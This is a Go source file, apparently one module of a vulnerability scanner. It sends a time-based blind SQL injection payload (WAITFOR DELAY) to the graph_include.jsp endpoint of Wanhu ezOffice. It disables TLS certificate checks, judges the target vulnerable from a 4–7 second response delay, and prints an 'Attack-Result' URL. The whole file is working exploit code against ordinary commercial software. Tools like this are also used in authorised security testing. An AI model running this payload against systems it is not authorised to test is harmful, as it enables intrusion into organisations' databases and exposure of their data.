package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func WanHuezOffice_SQLInjection(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%%2000:00:00.000%%27%%20as%%20datetime)%%20group%%20by%%20t.emp_id,t.empname%%20)%%20%%20s%%20group%%20by%%20empname%%20order%%20by%%20num%%20desc%%20%%20WAITFOR%%20DELAY%%20%%270:0:5%%27--", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	// 记录请求开始时间
	startTime := time.Now()

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	// 记录请求结束时间
	endTime := time.Now()

	// 计算请求时长
	duration := endTime.Sub(startTime)

	if 4*time.Second <= duration && duration <= 7*time.Second {
		fmt.Println("[*]万户ezOffice SQL注入漏洞 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%%2000:00:00.000%%27%%20as%%20datetime)%%20group%%20by%%20t.emp_id,t.empname%%20)%%20%%20s%%20group%%20by%%20empname%%20order%%20by%%20num%%20desc%%20%%20WAITFOR%%20DELAY%%20%%270:0:5%%27--\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
